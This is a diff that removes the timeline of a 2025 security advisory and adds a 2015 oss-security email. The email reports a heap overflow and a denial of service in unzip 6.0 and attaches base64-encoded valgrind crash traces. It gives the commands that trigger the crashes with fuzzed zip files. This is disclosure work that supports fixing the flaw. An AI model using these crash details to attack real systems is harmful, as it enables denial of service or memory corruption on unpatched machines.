-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Timeline
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-2025-01-15: We sent our advisory to the Ubuntu Security Team.
-
-2025-03-21: We noticed that @roddux (on X/Twitter) independently
-discovered and published the busybox bypass.
-
-2025-03-27: Coordinated release.
+X-Received: by 10.112.234.199 with SMTP id ug7mr1596820lbc.116.1441627041094;
+ Mon, 07 Sep 2015 04:57:21 -0700 (PDT)
+Date: Mon, 7 Sep 2015 08:57:20 -0300
+Message-ID: <CACn5sdRQaUEHfde5QzqnOSv829baMEgDBCN7n8rzzrb+1s2uMw@mail.gmail.com>
+From: Gustavo Grieco <gustavo.grieco@gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/mixed; boundary=001a11c3c34caf0138051f26f3e9
+Subject: [oss-security] Heap overflow and DoS in unzip 6.0
+
+--001a11c3c34caf0138051f26f3e9
+Content-Type: multipart/alternative; boundary=001a11c3c34caf0130051f26f3e7
+
+--001a11c3c34caf0130051f26f3e7
+Content-Type: text/plain; charset=UTF-8
+
+Hello,
+
+Two issues were found in unzip 6.0:
+
+* A heap overflow triggered by unzipping a file with password (e.g unzip -p
+-P x sigsegv.zip)
+* A denegation of service with a file that never finishes unzipping (e.g.
+unzip sigxcpu.zip).
+
+Upstream is notified. Nevertheless the test cases as well as the valgrind
+and the adress sanitizer reports of the heap overflow case are attached (as
+a single file) in case someone wants to provide some feedback. These issues
+were found with QuickFuzz.
+
+Regards,
+Gustavo.
+
+--001a11c3c34caf0130051f26f3e7
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<div dir=3D"ltr"><div><div><div>Hello,<br><br></div><div>Two issues were fo=
+und in unzip 6.0: <br><br></div><div>* A heap overflow triggered by unzippi=
+ng a file with password (e.g unzip -p -P x sigsegv.zip) <br>* A denegation =
+of service with a file that never finishes unzipping=20
+(e.g. unzip sigxcpu.zip). <br><br>Upstream is notified. Nevertheless the te=
+st cases as well as the valgrind and the adress=20
+sanitizer reports of the heap overflow case are attached (as a single=20
+file) in case someone wants to provide some feedback. These issues were fou=
+nd with QuickFuzz.<br></div><br></div>Regards,<br></div>Gustavo.<br></div>
+
+--001a11c3c34caf0130051f26f3e7--
+
+--001a11c3c34caf0138051f26f3e9
+Content-Type: text/plain; charset=UTF-8; name="report.txt"
+Content-Disposition: attachment; filename="report.txt"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_ie9vlf2r2
+
+PT03NTI1PT0gTWVtY2hlY2ssIGEgbWVtb3J5IGVycm9yIGRldGVjdG9yCj09
+NzUyNT09IENvcHlyaWdodCAoQykgMjAwMi0yMDEzLCBhbmQgR05VIEdQTCdk
+LCBieSBKdWxpYW4gU2V3YXJkIGV0IGFsLgo9PTc1MjU9PSBVc2luZyBWYWxn
+cmluZC0zLjEwLjAuU1ZOIGFuZCBMaWJWRVg7IHJlcnVuIHdpdGggLWggZm9y
+IGNvcHlyaWdodCBpbmZvCj09NzUyNT09IENvbW1hbmQ6IHVuemlwIC1wIC1Q
+IHggYnVnZ3kuZnV6emVkLnNpZ3NlZ3YuemlwCj09NzUyNT09IAp3YXJuaW5n
+IFtidWdneS5mdXp6ZWQuc2lnc2Vndi56aXBdOiAgMTEgZXh0cmEgYnl0ZXMg
+YXQgYmVnaW5uaW5nIG9yIHdpdGhpbiB6aXBmaWxlCiAgKGF0dGVtcHRpbmcg
+dG8gcHJvY2VzcyBhbnl3YXkpCmVycm9yIFtidWdneS5mdXp6ZWQuc2lnc2Vn
+di56aXBdOiAgcmVwb3J0ZWQgbGVuZ3RoIG9mIGNlbnRyYWwgZGlyZWN0b3J5
+IGlzCiAgLTExIGJ5dGVzIHRvbyBsb25nIChBdGFyaSBTVFppcCB6aXBmaWxl
+PyAgSi5ILkhvbG0gWklQU1BMSVQgMS4xCiAgemlwZmlsZT8pLiAgQ29tcGVu
+c2F0aW5nLi4uCj09NzUyNT09IENvbmRpdGlvbmFsIGp1bXAgb3IgbW92ZSBk
+ZXBlbmRzIG9uIHVuaW5pdGlhbGlzZWQgdmFsdWUocykKPT03NTI1PT0gICAg
+YXQgMHg4MDU5NUFGOiBnZXRaaXA2NERhdGEgKHByb2Nlc3MuYzoxOTI3KQo9
+PTc1MjU9PSAgICBieSAweDgwNTM0REI6IGRvX3N0cmluZyAoZmlsZWlvLmM6
+MjMwMCkKPT03NTI1PT0gICAgYnkgMHg4MDRFMjUwOiBleHRyYWN0X29yX3Rl
+c3RfZW50cnlsaXN0IChleHRyYWN0LmM6MTIxNCkKPT03NTI1PT0gICAgYnkg
+MHg4MDUwQzMwOiBleHRyYWN0X29yX3Rlc3RfZmlsZXMgKGV4dHJhY3QuYzo1
+ODYpCj09NzUyNT09ICAgIGJ5IDB4ODA1ODQ4MjogZG9fc2Vla2FibGUgKHBy
+b2Nlc3MuYzo5ODcpCj09NzUyNT09ICAgIGJ5IDB4ODA1OEJENjogcHJvY2Vz
+c196aXBmaWxlcyAocHJvY2Vzcy5jOjQwMSkKPT03NTI1PT0gICAgYnkgMHg4
+MDRCM0RCOiB1bnppcCAodW56aXAuYzoxMjc4KQo9PTc1MjU9PSAgICBieSAw
+eDgwNDk1RTY6IG1haW4gKHVuemlwLmM6NzQxKQo9PTc1MjU9PSAKPT03NTI1
+PT0gQ29uZGl0aW9uYWwganVtcCBvciBtb3ZlIGRlcGVuZHMgb24gdW5pbml0
+aWFsaXNlZCB2YWx1ZShzKQo9PTc1MjU9PSAgICBhdCAweDgwNTk1Qjk6IGdl
+dFppcDY0RGF0YSAocHJvY2Vzcy5jOjE5MzUpCj09NzUyNT09ICAgIGJ5IDB4
+ODA1MzREQjogZG9fc3RyaW5nIChmaWxlaW8uYzoyMzAwKQo9PTc1MjU9PSAg
+ICBieSAweDgwNEUyNTA6IGV4dHJhY3Rfb3JfdGVzdF9lbnRyeWxpc3QgKGV4
+dHJhY3QuYzoxMjE0KQo9PTc1MjU9PSAgICBieSAweDgwNTBDMzA6IGV4dHJh
+Y3Rfb3JfdGVzdF9maWxlcyAoZXh0cmFjdC5jOjU4NikKPT03NTI1PT0gICAg
+YnkgMHg4MDU4NDgyOiBkb19zZWVrYWJsZSAocHJvY2Vzcy5jOjk4NykKPT03
+NTI1PT0gICAgYnkgMHg4MDU4QkQ2OiBwcm9jZXNzX3ppcGZpbGVzIChwcm9j
+ZXNzLmM6NDAxKQo9PTc1MjU9PSAgICBieSAweDgwNEIzREI6IHVuemlwICh1
+bnppcC5jOjEyNzgpCj09NzUyNT09ICAgIGJ5IDB4ODA0OTVFNjogbWFpbiAo
+dW56aXAuYzo3NDEpCj09NzUyNT09IAo9PTc1MjU9PSBDb25kaXRpb25hbCBq
+dW1wIG9yIG1vdmUgZGVwZW5kcyBvbiB1bmluaXRpYWxpc2VkIHZhbHVlKHMp
+Cj09NzUyNT09ICAgIGF0IDB4ODA1OTU4ODogZ2V0WmlwNjREYXRhIChwcm9j
+ZXNzLmM6MTkyMikKPT03NTI1PT0gICAgYnkgMHg4MDUzNERCOiBkb19zdHJp
+bmcgKGZpbGVpby5jOjIzMDApCj09NzUyNT09ICAgIGJ5IDB4ODA0RTI1MDog
+ZXh0cmFjdF9vcl90ZXN0X2VudHJ5bGlzdCAoZXh0cmFjdC5jOjEyMTQpCj09
+NzUyNT09ICAgIGJ5IDB4ODA1MEMzMDogZXh0cmFjdF9vcl90ZXN0X2ZpbGVz
+IChleHRyYWN0LmM6NTg2KQo9PTc1MjU9PSAgICBieSAweDgwNTg0ODI6IGRv
+X3NlZWthYmxlIChwcm9jZXNzLmM6OTg3KQo9PTc1MjU9PSAgICBieSAweDgw
+NThCRDY6IHByb2Nlc3NfemlwZmlsZXMgKHByb2Nlc3MuYzo0MDEpCj09NzUy
+NT09ICAgIGJ5IDB4ODA0QjNEQjogdW56aXAgKHVuemlwLmM6MTI3OCkKPT03
+NTI1PT0gICAgYnkgMHg4MDQ5NUU2OiBtYWluICh1bnppcC5jOjc0MSkKPT03
+NTI1PT0gCj09NzUyNT09IFVzZSBvZiB1bmluaXRpYWxpc2VkIHZhbHVlIG9m
+IHNpemUgNAo9PTc1MjU9PSAgICBhdCAweDgwNTNENDQ6IG1ha2V3b3JkIChm
+aWxlaW8uYzoyNDI2KQo9PTc1MjU9PSAgICBieSAweDgwNTk1OTY6IGdldFpp
+cDY0RGF0YSAocHJvY2Vzcy5jOjE5MjQpCj09NzUyNT09ICAgIGJ5IDB4ODA1
+MzREQjogZG9fc3RyaW5nIChmaWxlaW8uYzoyMzAwKQo9PTc1MjU9PSAgICBi
+eSAweDgwNEUyNTA6IGV4dHJhY3Rfb3JfdGVzdF9lbnRyeWxpc3QgKGV4dHJh
+Y3QuYzoxMjE0KQo9PTc1MjU9PSAgICBieSAweDgwNTBDMzA6IGV4dHJhY3Rf
+b3JfdGVzdF9maWxlcyAoZXh0cmFjdC5jOjU4NikKPT03NTI1PT0gICAgYnkg
+MHg4MDU4NDgyOiBkb19zZWVrYWJsZSAocHJvY2Vzcy5jOjk4NykKPT03NTI1
+PT0gICAgYnkgMHg4MDU4QkQ2OiBwcm9jZXNzX3ppcGZpbGVzIChwcm9jZXNz
+LmM6NDAxKQo9PTc1MjU9PSAgICBieSAweDgwNEIzREI6IHVuemlwICh1bnpp
+cC5jOjEyNzgpCj09NzUyNT09ICAgIGJ5IDB4ODA0OTVFNjogbWFpbiAodW56
+aXAuYzo3NDEpCj09NzUyNT09IAo9PTc1MjU9PSBVc2Ugb2YgdW5pbml0aWFs
+aXNlZCB2YWx1ZSBvZiBzaXplIDQKPT03NTI1PT0gICAgYXQgMHg4MDUzRDQ0
+OiBtYWtld29yZCAoZmlsZWlvLmM6MjQyNikKPT03NTI1PT0gICAgYnkgMHg4
+MDU5NUEzOiBnZXRaaXA2NERhdGEgKHByb2Nlc3MuYzoxOTI1KQo9PTc1MjU9
+PSAgICBieSAweDgwNTM0REI6IGRvX3N0cmluZyAoZmlsZWlvLmM6MjMwMCkK
+PT03NTI1PT0gICAgYnkgMHg4MDRFMjUwOiBleHRyYWN0X29yX3Rlc3RfZW50
+cnlsaXN0IChleHRyYWN0LmM6MTIxNCkKPT03NTI1PT0gICAgYnkgMHg4MDUw
+QzMwOiBleHRyYWN0X29yX3Rlc3RfZmlsZXMgKGV4dHJhY3QuYzo1ODYpCj09
+NzUyNT09ICAgIGJ5IDB4ODA1ODQ4MjogZG9fc2Vla2FibGUgKHByb2Nlc3Mu
+Yzo5ODcpCj09NzUyNT09ICAgIGJ5IDB4ODA1OEJENjogcHJvY2Vzc196aXBm
+aWxlcyAocHJvY2Vzcy5jOjQwMSkKPT03NTI1PT0gICAgYnkgMHg4MDRCM0RC
+OiB1bnppcCAodW56aXAuYzoxMjc4KQo9PTc1MjU9PSAgICBieSAweDgwNDk1
+RTY6IG1haW4gKHVuemlwLmM6NzQxKQo9PTc1MjU9PSAKY8OlTV5eW0JLwq/C
+tTogIG1pc21hdGNoaW5nICJsb2NhbCIgZmlsZW5hbWUgKGPDpU1eXlpCS8Kv
+wrUpLAogICAgICAgICBjb250aW51aW5nIHdpdGggImNlbnRyYWwiIGZpbGVu
+YW1lIHZlcnNpb24KICBlcnJvcjogIGludmFsaWQgY29tcHJlc3NlZCBkYXRh
+IHRvIGluZmxhdGUgY8OlTV5eW0JLwq/CtQpmaWxlICMyOiAgYmFkIHppcGZp
+bGUgb2Zmc2V0IChsb2NhbCBoZWFkZXIgc2lnKTogIDE3OQpeXF5Ge2AwWig1
+eC46ICBtaXNtYXRjaGluZyAibG9jYWwiIGZpbGVuYW1lIChjw6VNXl5aQkvC
+r8K1KSwKICAgICAgICAgY29udGludWluZyB3aXRoICJjZW50cmFsIiBmaWxl
+bmFtZSB2ZXJzaW9uCl5cXkZ7YDBaKDV4LjogIHVjc2l6ZSA3IDw+IGNzaXpl
+IDIgZm9yIFNUT1JFRCBlbnRyeQogICAgICAgICBjb250aW51aW5nIHdpdGgg
+ImNvbXByZXNzZWQiIHNpemUgdmFsdWUKXlxeRntgMFooNXguICAgICAgICAg
+ICAgYmFkIENSQyAwZTk4ODQzOCAgKHNob3VsZCBiZSAwMDAwMDAwYSkKXsK7
+woguTMOgaHA6ICB1Y3NpemUgMjY0IDw+IGNzaXplIDE4NDQ2NzQ0MDczNzA5
+NTUxNjExIGZvciBTVE9SRUQgZW50cnkKICAgICAgICAgY29udGludWluZyB3
+aXRoICJjb21wcmVzc2VkIiBzaXplIHZhbHVlCj09NzUyNT09IFVzZSBvZiB1
+bmluaXRpYWxpc2VkIHZhbHVlIG9mIHNpemUgNAo9PTc1MjU9PSAgICBhdCAw
+eDgwNEI3OEI6IHVwZGF0ZV9rZXlzIChjcnlwdC5jOjE2NykKPT03NTI1PT0g
+ICAgYnkgMHg4MDRCOEY2OiB0ZXN0a2V5IChjcnlwdC5jOjY0MSkKPT03NTI1
+PT0gICAgYnkgMHg4MDRCOTRGOiB0ZXN0cCAoY3J5cHQuYzo1NDgpCj09NzUy
+NT09ICAgIGJ5IDB4ODA0QkE2MzogZGVjcnlwdCAoY3J5cHQuYzo0OTMpCj09
+NzUyNT09ICAgIGJ5IDB4ODA0RTdERDogZXh0cmFjdF9vcl90ZXN0X2VudHJ5
+bGlzdCAoZXh0cmFjdC5jOjEyNzUpCj09NzUyNT09ICAgIGJ5IDB4ODA1MEMz
+MDogZXh0cmFjdF9vcl90ZXN0X2ZpbGVzIChleHRyYWN0LmM6NTg2KQo9PTc1
+MjU9PSAgICBieSAweDgwNTg0ODI6IGRvX3NlZWthYmxlIChwcm9jZXNzLmM6
+OTg3KQo9PTc1MjU9PSAgICBieSAweDgwNThCRDY6IHByb2Nlc3NfemlwZmls
+ZXMgKHByb2Nlc3MuYzo0MDEpCj09NzUyNT09ICAgIGJ5IDB4ODA0QjNEQjog
+dW56aXAgKHVuemlwLmM6MTI3OCkKPT03NTI1PT0gICAgYnkgMHg4MDQ5NUU2
+OiBtYWluICh1bnppcC5jOjc0MSkKPT03NTI1PT0gCj09NzUyNT09IEludmFs
+aWQgcmVhZCBvZiBzaXplIDEKPT03NTI1PT0gICAgYXQgMHg4MDRCOEU4OiB0
+ZXN0a2V5IChjcnlwdC5jOjY0MSkKPT03NTI1PT0gICAgYnkgMHg4MDRCOTRG
+OiB0ZXN0cCAoY3J5cHQuYzo1NDgpCj09NzUyNT09ICAgIGJ5IDB4ODA0QkE2
+MzogZGVjcnlwdCAoY3J5cHQuYzo0OTMpCj09NzUyNT09ICAgIGJ5IDB4ODA0
+RTdERDogZXh0cmFjdF9vcl90ZXN0X2VudHJ5bGlzdCAoZXh0cmFjdC5jOjEy
+NzUpCj09NzUyNT09ICAgIGJ5IDB4ODA1MEMzMDogZXh0cmFjdF9vcl90ZXN0
+X2ZpbGVzIChleHRyYWN0LmM6NTg2KQo9PTc1MjU9PSAgICBieSAweDgwNTg0
+ODI6IGRvX3NlZWthYmxlIChwcm9jZXNzLmM6OTg3KQo9PTc1MjU9PSAgICBi
+eSAweDgwNThCRDY6IHByb2Nlc3NfemlwZmlsZXMgKHByb2Nlc3MuYzo0MDEp
+Cj09NzUyNT09ICAgIGJ5IDB4ODA0QjNEQjogdW56aXAgKHVuemlwLmM6MTI3
+OCkKPT03NTI1PT0gICAgYnkgMHg4MDQ5NUU2OiBtYWluICh1bnppcC5jOjc0
+MSkKPT03NTI1PT0gIEFkZHJlc3MgMHg0MjA3YjNjIGlzIDAgYnl0ZXMgYWZ0
+ZXIgYSBibG9jayBvZiBzaXplIDgsMTk2IGFsbG9jJ2QKPT03NTI1PT0gICAg
+YXQgMHg0MDJBMTdDOiBtYWxsb2MgKGluIC91c3IvbGliL3ZhbGdyaW5kL3Zn
+cHJlbG9hZF9tZW1jaGVjay14ODYtbGludXguc28pCj09NzUyNT09ICAgIGJ5
+IDB4ODA1OEE5MDogcHJvY2Vzc196aXBmaWxlcyAocHJvY2Vzcy5jOjI1MCkK
+PT03NTI1PT0gICAgYnkgMHg4MDRCM0RCOiB1bnppcCAodW56aXAuYzoxMjc4
+KQo9PTc1MjU9PSAgICBieSAweDgwNDk1RTY6IG1haW4gKHVuemlwLmM6NzQx
+KQo9PTc1MjU9PSAKPT03NTI1PT0gSW52YWxpZCB3cml0ZSBvZiBzaXplIDEK
+PT03NTI1PT0gICAgYXQgMHg4MDRCOEVCOiB0ZXN0a2V5IChjcnlwdC5jOjY0
+MSkKPT03NTI1PT0gICAgYnkgMHg4MDRCOTRGOiB0ZXN0cCAoY3J5cHQuYzo1
+NDgpCj09NzUyNT09ICAgIGJ5IDB4ODA0QkE2MzogZGVjcnlwdCAoY3J5cHQu
+Yzo0OTMpCj09NzUyNT09ICAgIGJ5IDB4ODA0RTdERDogZXh0cmFjdF9vcl90
+ZXN0X2VudHJ5bGlzdCAoZXh0cmFjdC5jOjEyNzUpCj09NzUyNT09ICAgIGJ5
+IDB4ODA1MEMzMDogZXh0cmFjdF9vcl90ZXN0X2ZpbGVzIChleHRyYWN0LmM6
+NTg2KQo9PTc1MjU9PSAgICBieSAweDgwNTg0ODI6IGRvX3NlZWthYmxlIChw
+cm9jZXNzLmM6OTg3KQo9PTc1MjU9PSAgICBieSAweDgwNThCRDY6IHByb2Nl
+c3NfemlwZmlsZXMgKHByb2Nlc3MuYzo0MDEpCj09NzUyNT09ICAgIGJ5IDB4
+ODA0QjNEQjogdW56aXAgKHVuemlwLmM6MTI3OCkKPT03NTI1PT0gICAgYnkg
+MHg4MDQ5NUU2OiBtYWluICh1bnppcC5jOjc0MSkKPT03NTI1PT0gIEFkZHJl
+c3MgMHg0MjA3YjNjIGlzIDAgYnl0ZXMgYWZ0ZXIgYSBibG9jayBvZiBzaXpl
+IDgsMTk2IGFsbG9jJ2QKPT03NTI1PT0gICAgYXQgMHg0MDJBMTdDOiBtYWxs
+b2MgKGluIC91c3IvbGliL3ZhbGdyaW5kL3ZncHJlbG9hZF9tZW1jaGVjay14
+ODYtbGludXguc28pCj09NzUyNT09ICAgIGJ5IDB4ODA1OEE5MDogcHJvY2Vz
+c196aXBmaWxlcyAocHJvY2Vzcy5jOjI1MCkKPT03NTI1PT0gICAgYnkgMHg4
+MDRCM0RCOiB1bnppcCAodW56aXAuYzoxMjc4KQo9PTc1MjU9PSAgICBieSAw
+eDgwNDk1RTY6IG1haW4gKHVuemlwLmM6NzQxKQo9PTc1MjU9PSAKCmVycm9y
+OiAgemlwZmlsZSBwcm9iYWJseSBjb3JydXB0IChzZWdtZW50YXRpb24gdmlv
+bGF0aW9uKQo9PTc1MjU9PSBJbnZhbGlkIHJlYWQgb2Ygc2l6ZSA0Cj09NzUy
+NT09ICAgIGF0IDB4NDAwRjI4RjogX2RsX2ZpbmkgKGRsLWZpbmkuYzoxOTMp
+Cj09NzUyNT09ICAgIGJ5IDB4NDA4OTFCMDogX19ydW5fZXhpdF9oYW5kbGVy
+cyAoZXhpdC5jOjgyKQo9PTc1MjU9PSAgICBieSAweDQwODkyMEM6IGV4aXQg
+KGV4aXQuYzoxMDQpCj09NzUyNT09ICAgIGJ5IDB4ODA1MzE2QTogaGFuZGxl
+ciAoZmlsZWlvLmM6MTY1OSkKPT03NTI1PT0gICAgYnkgMHg0MDg0NkE3OiA/
+Pz8gKGluIC9saWIvaTM4Ni1saW51eC1nbnUvbGliYy0yLjE5LnNvKQo9PTc1
+MjU9PSAgICBieSAweDgwNTBDMzA6IGV4dHJhY3Rfb3JfdGVzdF9maWxlcyAo
+ZXh0cmFjdC5jOjU4NikKPT03NTI1PT0gICAgYnkgMHg4MDU4NDgyOiBkb19z
+ZWVrYWJsZSAocHJvY2Vzcy5jOjk4NykKPT03NTI1PT0gICAgYnkgMHg4MDU4
+QkQ2OiBwcm9jZXNzX3ppcGZpbGVzIChwcm9jZXNzLmM6NDAxKQo9PTc1MjU9
+PSAgICBieSAweDgwNEIzREI6IHVuemlwICh1bnppcC5jOjEyNzgpCj09NzUy
+NT09ICAgIGJ5IDB4ODA0OTVFNjogbWFpbiAodW56aXAuYzo3NDEpCj09NzUy
+NT09ICBBZGRyZXNzIDB4OWQ1NDFmNDIgaXMgbm90IHN0YWNrJ2QsIG1hbGxv
+YydkIG9yIChyZWNlbnRseSkgZnJlZSdkCj09NzUyNT09IAo9PTc1MjU9PSAK
+PT03NTI1PT0gUHJvY2VzcyB0ZXJtaW5hdGluZyB3aXRoIGRlZmF1bHQgYWN0
+aW9uIG9mIHNpZ25hbCAxMSAoU0lHU0VHVikKPT03NTI1PT0gIEFjY2VzcyBu
+b3Qgd2l0aGluIG1hcHBlZCByZWdpb24gYXQgYWRkcmVzcyAweDlENTQxRjQy
+Cj09NzUyNT09ICAgIGF0IDB4NDAwRjI4RjogX2RsX2ZpbmkgKGRsLWZpbmku
+YzoxOTMpCj09NzUyNT09ICAgIGJ5IDB4NDA4OTFCMDogX19ydW5fZXhpdF9o
+YW5kbGVycyAoZXhpdC5jOjgyKQo9PTc1MjU9PSAgICBieSAweDQwODkyMEM6
+IGV4aXQgKGV4aXQuYzoxMDQpCj09NzUyNT09ICAgIGJ5IDB4ODA1MzE2QTog
+aGFuZGxlciAoZmlsZWlvLmM6MTY1OSkKPT03NTI1PT0gICAgYnkgMHg0MDg0
+NkE3OiA/Pz8gKGluIC9saWIvaTM4Ni1saW51eC1nbnUvbGliYy0yLjE5LnNv
+KQo9PTc1MjU9PSAgICBieSAweDgwNTBDMzA6IGV4dHJhY3Rfb3JfdGVzdF9m
+aWxlcyAoZXh0cmFjdC5jOjU4NikKPT03NTI1PT0gICAgYnkgMHg4MDU4NDgy
+OiBkb19zZWVrYWJsZSAocHJvY2Vzcy5jOjk4NykKPT03NTI1PT0gICAgYnkg
+MHg4MDU4QkQ2OiBwcm9jZXNzX3ppcGZpbGVzIChwcm9jZXNzLmM6NDAxKQo9
+PTc1MjU9PSAgICBieSAweDgwNEIzREI6IHVuemlwICh1bnppcC5jOjEyNzgp
+Cj09NzUyNT09ICAgIGJ5IDB4ODA0OTVFNjogbWFpbiAodW56aXAuYzo3NDEp
+Cj09NzUyNT09ICBJZiB5b3UgYmVsaWV2ZSB0aGlzIGhhcHBlbmVkIGFzIGEg
+cmVzdWx0IG9mIGEgc3RhY2sKPT03NTI1PT0gIG92ZXJmbG93IGluIHlvdXIg
+cHJvZ3JhbSdzIG1haW4gdGhyZWFkICh1bmxpa2VseSBidXQKPT03NTI1PT0g
+IHBvc3NpYmxlKSwgeW91IGNhbiB0cnkgdG8gaW5jcmVhc2UgdGhlIHNpemUg
+b2YgdGhlCj09NzUyNT09ICBtYWluIHRocmVhZCBzdGFjayB1c2luZyB0aGUg
+LS1tYWluLXN0YWNrc2l6ZT0gZmxhZy4KPT03NTI1PT0gIFRoZSBtYWluIHRo
+cmVhZCBzdGFjayBzaXplIHVzZWQgaW4gdGhpcyBydW4gd2FzIDgzODg2MDgu
+Cj09NzUyNT09IEludmFsaWQgcmVhZCBvZiBzaXplIDQKPT03NTI1PT0gICAg
+YXQgMHg0MTNEODNBOiB0ZGVzdHJveV9yZWN1cnNlICh0c2VhcmNoLmM6NjM4
+KQo9PTc1MjU9PSAgICBieSAweDQxM0Q4NTA6IHRkZXN0cm95X3JlY3Vyc2Ug
+KHRzZWFyY2guYzo2MzkpCj09NzUyNT09ICAgIGJ5IDB4NDE5RUUwNjogZnJl
+ZV9tZW0gKGluIC9saWIvaTM4Ni1saW51eC1nbnUvbGliYy0yLjE5LnNvKQo9
+PTc1MjU9PSAgICBieSAweDQxOUY0MDk6IF9fbGliY19mcmVlcmVzIChpbiAv
+bGliL2kzODYtbGludXgtZ251L2xpYmMtMi4xOS5zbykKPT03NTI1PT0gICAg
+YnkgMHg0MDI0NTI2OiBfdmduVV9mcmVlcmVzIChpbiAvdXNyL2xpYi92YWxn
+cmluZC92Z3ByZWxvYWRfY29yZS14ODYtbGludXguc28pCj09NzUyNT09ICBB
+ZGRyZXNzIDB4ZjllNGVkYjYgaXMgbm90IHN0YWNrJ2QsIG1hbGxvYydkIG9y
+IChyZWNlbnRseSkgZnJlZSdkCj09NzUyNT09IAo9PTc1MjU9PSAKPT03NTI1
+PT0gUHJvY2VzcyB0ZXJtaW5hdGluZyB3aXRoIGRlZmF1bHQgYWN0aW9uIG9m
+IHNpZ25hbCAxMSAoU0lHU0VHVikKPT03NTI1PT0gIEFjY2VzcyBub3Qgd2l0
+aGluIG1hcHBlZCByZWdpb24gYXQgYWRkcmVzcyAweEY5RTRFREI2Cj09NzUy
+NT09ICAgIGF0IDB4NDEzRDgzQTogdGRlc3Ryb3lfcmVjdXJzZSAodHNlYXJj
+aC5jOjYzOCkKPT03NTI1PT0gICAgYnkgMHg0MTNEODUwOiB0ZGVzdHJveV9y
+ZWN1cnNlICh0c2VhcmNoLmM6NjM5KQo9PTc1MjU9PSAgICBieSAweDQxOUVF
+MDY6IGZyZWVfbWVtIChpbiAvbGliL2kzODYtbGludXgtZ251L2xpYmMtMi4x
+OS5zbykKPT03NTI1PT0gICAgYnkgMHg0MTlGNDA5OiBfX2xpYmNfZnJlZXJl
+cyAoaW4gL2xpYi9pMzg2LWxpbnV4LWdudS9saWJjLTIuMTkuc28pCj09NzUy
+NT09ICAgIGJ5IDB4NDAyNDUyNjogX3ZnblVfZnJlZXJlcyAoaW4gL3Vzci9s
+aWIvdmFsZ3JpbmQvdmdwcmVsb2FkX2NvcmUteDg2LWxpbnV4LnNvKQo9PTc1
+MjU9PSAgSWYgeW91IGJlbGlldmUgdGhpcyBoYXBwZW5lZCBhcyBhIHJlc3Vs
+dCBvZiBhIHN0YWNrCj09NzUyNT09ICBvdmVyZmxvdyBpbiB5b3VyIHByb2dy
+YW0ncyBtYWluIHRocmVhZCAodW5saWtlbHkgYnV0Cj09NzUyNT09ICBwb3Nz
+aWJsZSksIHlvdSBjYW4gdHJ5IHRvIGluY3JlYXNlIHRoZSBzaXplIG9mIHRo
+ZQo9PTc1MjU9PSAgbWFpbiB0aHJlYWQgc3RhY2sgdXNpbmcgdGhlIC0tbWFp
+bi1zdGFja3NpemU9IGZsYWcuCj09NzUyNT09ICBUaGUgbWFpbiB0aHJlYWQg
+c3RhY2sgc2l6ZSB1c2VkIGluIHRoaXMgcnVuIHdhcyA4Mzg4NjA4Lgo9PTc1
+MjU9PSAKPT03NTI1PT0gSEVBUCBTVU1NQVJZOgo9PTc1MjU9PSAgICAgaW4g
+dXNlIGF0IGV4aXQ6IDc5LDg2OSBieXRlcyBpbiAyMCBibG9ja3MKPT03NTI1
+PT0gICB0b3RhbCBoZWFwIHVzYWdlOiA3OCBhbGxvY3MsIDU4IGZyZWVzLCAz
+NDUsMDAyIGJ5dGVzIGFsbG9jYXRlZAo9PTc1MjU9PSAKPT03NTI1PT0gTEVB
+SyBTVU1NQVJZOgo9PTc1MjU9PSAgICBkZWZpbml0ZWx5IGxvc3Q6IDE2MCBi
+eXRlcyBpbiAzIGJsb2Nrcwo9PTc1MjU9PSAgICBpbmRpcmVjdGx5IGxvc3Q6
+IDAgYnl0ZXMgaW4gMCBibG9ja3MKPT03NTI1PT0gICAgICBwb3NzaWJseSBs
+b3N0OiA0MCBieXRlcyBpbiAyIGJsb2Nrcwo9PTc1MjU9PSAgICBzdGlsbCBy
+ZWFjaGFibGU6IDc5LDY2OSBieXRlcyBpbiAxNSBibG9ja3MKPT03NTI1PT0g
+ICAgICAgICBzdXBwcmVzc2VkOiAwIGJ5dGVzIGluIDAgYmxvY2tzCj09NzUy
+NT09IFJlcnVuIHdpdGggLS1sZWFrLWNoZWNrPWZ1bGwgdG8gc2VlIGRldGFp
+bHMgb2YgbGVha2VkIG1lbW9yeQo9PTc1MjU9PSAKPT03NTI1PT0gRm9yIGNv
+dW50cyBvZiBkZXRlY3RlZCBhbmQgc3VwcHJlc3NlZCBlcnJvcnMsIHJlcnVu
+IHdpdGg6IC12Cj09NzUyNT09IFVzZSAtLXRyYWNrLW9yaWdpbnM9eWVzIHRv
+IHNlZSB3aGVyZSB1bmluaXRpYWxpc2VkIHZhbHVlcyBjb21lIGZyb20KPT03
+NTI1PT0gRVJST1IgU1VNTUFSWTogODMwMjQ1MSBlcnJvcnMgZnJvbSAxMCBj
+b250ZXh0cyAoc3VwcHJlc3NlZDogMCBmcm9tIDApClNlZ21lbnRhdGlvbiBm
+YXVsdAoKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLQoKLi91bnppcCAtcCAtUCB4IGJ1Z2d5LmZ1enplZC5zaWdzZWd2
+LnppcAp3YXJuaW5nIFtidWdneS5mdXp6ZWQuc2lnc2Vndi56aXBdOiAgMTEg
+ZXh0cmEgYnl0ZXMgYXQgYmVnaW5uaW5nIG9yIHdpdGhpbiB6aXBmaWxlCiAg
